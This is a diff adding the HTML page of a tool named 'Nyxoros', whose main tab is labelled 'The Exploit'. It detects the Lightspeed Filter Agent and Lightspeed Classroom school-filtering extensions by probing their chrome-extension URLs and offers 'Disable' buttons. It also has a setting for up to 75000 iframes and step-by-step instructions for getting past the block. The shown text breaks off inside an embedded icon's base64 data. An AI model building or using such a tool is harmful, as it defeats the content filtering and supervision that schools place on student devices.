@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nyxoros</title>
+    <meta name="title" content="Nyxoros">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap');
+
+        * {
+            font-family: "Roboto", arial;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #1a1d22;
+            color: #fff;
+            display: flex;
+            margin-left: 250px;
+            font-size: 16px;
+        }
+
+        .open-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 18px;
+            background: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: background 0.3s ease;
+            max-width: auto; /* Allow the width to grow dynamically */
+            width: auto; /* Ensures button size adapts to the text content */
+            white-space: normal; /* Allows text to wrap if necessary */
+            text-align: center; /* Center the text inside */
+        }
+
+        /* Optional: Change background on hover for better interaction feedback */
+        .open-btn:hover {
+            background: #0056b3;
+        }
+
+        .popup {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1000;
+            opacity: 0; /* Hidden */
+            transform: scale(0.9); /* Small size */
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup.show {
+            opacity: 1; /* Make it visible */
+            transform: scale(1); /* Normal size */
+        }
+
+        /* Popup content */
+        .popup-content {
+            background: black; /* Solid black background */
+            border-radius: 45px;
+            padding: 20px; /* Adjust padding to your preference */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2); /* Optional shadow for depth */
+            text-align: center;
+            max-width: 700px;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Show popup with fade-in effect */
+        .popup.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* Close button */
+        .close-btn {
+            margin-top: 20px;
+            padding: 10px 16px;
+            background: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: background 0.3s ease;
+        }
+
+        .close-btn:hover {
+            background: darkred;
+        }
+
+        .side-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 250px;
+            height: 100vh;
+            background-color: #26292e;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            padding: 30px 20px;
+            border-right: 2px solid #444;
+            box-shadow: 4px 0 8px rgba(0, 0, 0, 0.4);
+        }
+
+        .side-panel img {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 20px;
+            object-fit: contain;
+        }
+
+        .side-panel h2 {
+            font-weight: bold;
+            font-size: 22px;
+            margin-bottom: 40px;
+        }
+
+        .side-panel .option {
+            position: relative;
+            overflow: hidden;
+            margin: 12px 0;
+            font-size: 18px;
+            cursor: pointer;
+            padding-left: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            border-radius: 30px;
+            transition: background-color 0.3s ease, padding-left 0.3s ease;
+        }
+
+        .side-panel .option:hover {
+            background-color: #373b3e;
+            color: #fff;
+            padding-left: 60px;
+        }
+
+        .side-panel .option.selected {
+            background-color: #6c8cbf;
+            color: black;
+        }
+
+        .side-panel footer {
+            margin-top: auto;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 14px;
+            color: #c4c7c5;
+        }
+
+        .side-panel footer a {
+            color: #9dbae9;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .side-panel footer a:hover {
+            text-decoration: underline;
+        }
+
+        .main-content {
+            flex-grow: 1;
+            padding: 30px 40px;
+            background: #222529;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+        }
+
+        .extension-container {
+            display: flex;
+            flex-direction: column-reverse;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 12px;
+            background: #292a2d;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            width: 375px;
+            height: 150px;
+            position: relative;
+            transition: box-shadow 0.3s ease;
+        }
+
+        .extension-container:hover {
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.6);
+        }
+
+        .extension-info {
+            display: flex;
+            align-items: center;
+            margin: 10px;
+            gap: 8px;
+            justify-content: flex-end;
+        }
+
+        .extension-name {
+            font-size: 15px;
+            color: #fff;
+        }
+
+        .extension-id {
+            font-size: 13px;
+            color: #c4c7c5;
+        }
+
+        .extension-container img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+
+        button {
+            background: transparent;
+            color: #9dbae9;
+            font-weight: bold;
+            border: 2px solid #047db7;
+            border-radius: 25px;
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            outline: none;
+        }
+
+        button:hover {
+            background: #373b3e;
+            transform: scale(1.05);
+        }
+
+        a {
+            color: #9dbae9;
+        }
+
+        h3 {
+            margin-left: 35px;
+            color: white;
+            margin-top: 20px;
+        }
+
+        #div-container {
+            display: flex;
+            flex-wrap: wrap;
+            margin-left: 20px;
+            gap: 20px;
+        }
+
+        #about-tab, #settings-tab {
+            margin-left: 50px;
+        }
+
+        #printer-tab {
+            margin-left: 10px;
+        }
+
+        .ripple {
+            position: absolute;
+            border-radius: 100%;
+            transform: scale(0);
+            background: rgba(0, 0, 0, 0.2);
+            animation: ripple-animation 0.2s linear;
+            pointer-events: none;
+        }
+
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 36px;
+            height: 20px;
+            margin-left: 10px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #444746;
+            border-radius: 15px;
+            border: 1.5px solid #8e918f;
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+        }
+
+        .slider:before {
+            content: "";
+            position: absolute;
+            height: 12px;
+            width: 12px;
+            left: 4px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #8e918f;
+            border-radius: 50%;
+            transition: transform 0.2s ease, background-color 0.2s ease;
+        }
+
+        .switch:hover .slider:before {
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
+        }
+
+        input:checked + .slider {
+            background-color: #6c8cbf;
+            border-color: #6c8cbf;
+        }
+
+        input:checked + .slider:before {
+            transform: translate(16px, -50%);
+            background-color: #062e6f;
+        }
+
+        #dev-settings {
+            margin-top: 20px;
+        }
+
+        #iframe-count {
+            margin-top: 20px;
+            width: 200px;
+            height: 10px;
+            appearance: none;
+            background: #444746;
+            border: 1.5px solid #8e918f;
+            border-radius: 15px;
+            outline: none;
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+        }
+
+        #iframe-count::-webkit-slider-thumb {
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            background: #8e918f;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: transform 0.2s ease, background-color 0.2s ease;
+        }
+
+        #iframe-count:hover::-webkit-slider-thumb {
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
+        }
+
+        #iframe-count:active::-webkit-slider-thumb {
+            background: #6c8cbf;
+        }
+
+        .contributor {
+            margin-right: 5px;
+        }
+
+        .contributor > img {
+            width: 55px;
+            border-radius: 50%;
+            border: 2px solid #444;
+        }
+
+        .cmd-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1e1f22;
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            display: none; /* Hidden by default */
+        }
+
+        .cmd-box input {
+            background: #292a2d;
+            border: none;
+            color: white;
+            padding: 8px;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .cmd-box button {
+            background: #007BFF;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .cmd-box button:hover {
+            background: #0056b3;
+        }
+
+        .cmd-history {
+    position: fixed;
+    bottom: 70px; /* Adjust based on command box height */
+    right: 20px;
+    background: #1e1f22;
+    padding: 10px;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    color: white;
+    max-height: 200px;
+    overflow-y: auto; /* Enable scrolling */
+    width: 300px;
+    display: none; /* Hidden by default */
+    font-family: "Roboto", sans-serif;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+.cmd-history.show {
+    display: block; /* Show when needed */
+}
+
+/* Hide scrollbar but keep functionality */
+.cmd-history::-webkit-scrollbar {
+    width: 0; /* Hide scrollbar for Chrome, Safari, and Opera */
+}
+
+.cmd-history {
+    scrollbar-width: none; /* Hide scrollbar for Firefox */
+    -ms-overflow-style: none; /* Hide scrollbar for IE and Edge */
+}
+
+/* Style for individual history items */
+.cmd-history div {
+    padding: 5px;
+    border-bottom: 1px solid #444; /* Add a subtle separator */
+}
+
+.cmd-history div:last-child {
+    border-bottom: none; /* Remove separator for the last item */
+}
+    </style>
+</head>
+<body>
+    <div class="side-panel">
+        <div style="display: flex; align-items: center;">
+            <h2>Nyxoros</h2>
+        </div>
+        <div class="option" data-name="printer-tab">The Exploit</div>
+        <div class="option" data-name="settings-tab">Settings</div>
+        <div style="border-top: 1px solid #444; margin-top: 10px; padding-top: 10px; width: 100%;"></div>
+        <p style="text-align: center; margin-left: -10px; user-select: none;">Made by <a href="https://github.com/Nyxoros/" target="_blank">Nyxoros</a></p>
+    </div>
+    <div class="main-content">
+        <!-- Command Box -->
+        <div class="cmd-box" id="cmd-box">
+            <input type="text" id="cmd-input" placeholder="Enter command...">
+            <button onclick="executeCommand()">Execute</button>
+        </div>
+    
+        <!-- Command History Display -->
+        <div id="cmd-history" class="cmd-history"></div>
+    
+        <!-- Rest of your existing content -->
+        <div id="printer-tab">
+            <h3 style="user-select: none; font-weight: 400;"></h3>
+            <div id="div-container"></div>
+        </div>
+        <div id="settings-tab" style="display: none;">
+            <h2 style="user-select: none;">Settings</h2>
+            <label for="show-all-extensions" style="display: none;"></label>
+            <input id="show-all-extensions" style="display: none;">
+            <label for="iframe-count">Amount of iframes</label>
+            <input type="range" min="100" max="75000" value="75000" step="100" id="iframe-count">
+            <span id="iframe-count-display">75000</span>
+            <div style="border-top: 1px solid #444; margin-bottom: 10px; margin-top: 20px; padding-top: 10px; width: 100%;"></div>
+        </div>
+    
+        <button class="open-btn" onclick="openPopup()">READ NOW!</button>
+    
+        <!-- Fullscreen popup -->
+        <div class="popup" id="popup">
+            <div class="popup-content">
+                <h1>IF YOU ALREADY DID THE UNBLOCK DOC THEN JUST CLOSE AND DISABLE THEN READ THE INSTRUCTION</h1>
+                <h2>Steps to Follow:</h2>
+                <ol>
+                    <li>Open a new tab.</li>
+                    <li>Press <strong>Ctrl + P</strong> to open the print settings.</li>
+                    <li>Click <strong>More settings</strong> and find <strong>Margins</strong>.</li>
+                    <li>Set <strong>Margins</strong> to <strong>Custom</strong> and make them as small as possible.</li>
+                    <li>Under <strong>Scale</strong>, choose <strong>Custom</strong> and set it to <strong>200</strong>.</li>
+                    <li>Close the print settings.</li>
+                    <li>In <strong>Nyxoros</strong>, click the <strong>Close</strong> button.</li>
+                    <li>Click <strong>Disable</strong>, then read the content.</li>
+                    <li>Done! 🎉</li>
+                </ol>
+                <button class="close-btn" onclick="closePopup()">Close</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        let optionButtons = document.querySelectorAll(".option");
+
+function HideAll() {
+    optionButtons.forEach(button => {
+        let dataName = button.getAttribute("data-name");
+        document.getElementById(dataName).style.display = "none";
+        button.classList.remove("selected");
+    });
+}
+
+optionButtons.forEach((button) => {
+    let dataName = button.getAttribute("data-name");
+    button.addEventListener("click", () => {
+        HideAll();
+        document.getElementById(dataName).style.display = "block";
+        button.classList.add("selected");
+    });
+});
+
+document.getElementById("show-all-extensions").addEventListener("change", function () {
+    extContainer.innerHTML = "";
+    createExtensionButtons();
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    document.querySelector("div.option").classList.add("selected");
+});
+
+document.querySelectorAll(".option").forEach(option => {
+    option.addEventListener("click", function (e) {
+        this.querySelectorAll(".ripple").forEach(ripple => ripple.remove());
+
+        let ripple = document.createElement("span");
+        ripple.classList.add("ripple");
+
+        let rect = this.getBoundingClientRect();
+        let size = Math.max(rect.width, rect.height);
+        ripple.style.width = ripple.style.height = `${size}px`;
+
+        let x = e.clientX - rect.left - size / 2;
+        let y = e.clientY - rect.top - size / 2;
+        ripple.style.left = `${x}px`;
+        ripple.style.top = `${y}px`;
+
+        this.appendChild(ripple);
+
+        setTimeout(() => ripple.remove(), 600);
+    });
+});
+
+async function checkExtensionURL(url) {
+    try {
+        const response = await fetch(url);
+        if (response.ok) return true;
+    } catch (error) {
+        // Handle error
+    }
+
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        if (response.ok) return true;
+    } catch (error) {
+        // Handle error
+    }
+
+    return false;
+}
+
+function getExtensionId(url) {
+    const regex = /^chrome-extension:\/\/([^\/]+)/;
+    const match = url.match(regex);
+    return match ? match[1] : 'Unknown ID';
+}
+
+const extContainer = document.getElementById("div-container");
+async function TryAddExtension(name, icon, url) {
+    let showAll = document.getElementById("show-all-extensions").checked;
+
+    if (showAll || await checkExtensionURL(url)) {
+        const div = document.createElement("div");
+        div.classList.add("extension-container");
+
+        const img = document.createElement("img");
+        img.src = icon || "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
+        img.onerror = function() {
+            this.src = "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
+        };
+        img.alt = `${name} Icon`;
+        img.style.userSelect = "none";
+
+        const infoDiv = document.createElement("div");
+        infoDiv.classList.add("extension-info");
+
+        const nameText = document.createElement("span");
+        nameText.classList.add("extension-name");
+        nameText.textContent = name;
+
+        const idText = document.createElement("span");
+        const extensionId = getExtensionId(url);
+        idText.classList.add("extension-id");
+        idText.textContent = `ID: ${extensionId}`;
+
+        const button = document.createElement("button");
+        button.textContent = "Disable";
+        button.style.userSelect = "none";
+        button.onclick = () => createPopup(name, icon, url, extensionId);
+
+        infoDiv.appendChild(img);
+        infoDiv.appendChild(nameText);
+        div.appendChild(button);
+        div.appendChild(idText);
+        div.appendChild(infoDiv);
+        extContainer.appendChild(div);
+
+        return true;
+    }
+}
+
+const extensions = {
+    "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+    "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+};
+
+const icons = {
+    "Lightspeed Filter Agent": "data:image/png;base64,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